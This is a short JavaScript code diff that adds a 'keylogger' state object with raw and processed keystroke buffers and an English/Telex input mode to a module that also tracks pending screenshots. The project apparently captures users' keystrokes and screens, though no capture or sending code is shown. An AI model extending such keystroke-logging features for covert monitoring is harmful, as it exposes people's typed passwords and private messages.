@@ -46,5 +46,11 @@ export const state = {
     },
 
     // Screenshot
-    screenshotPending: false
+    screenshotPending: false,
+
+    keylogger: {
+        rawBuffer: "",          // Lưu log thô (có cả [ENTER], [SHIFT]...)
+        processedBuffer: "",    // Lưu văn bản đã xử lý
+        mode: 'english'         // 'english' hoặc 'telex'
+    }
 };
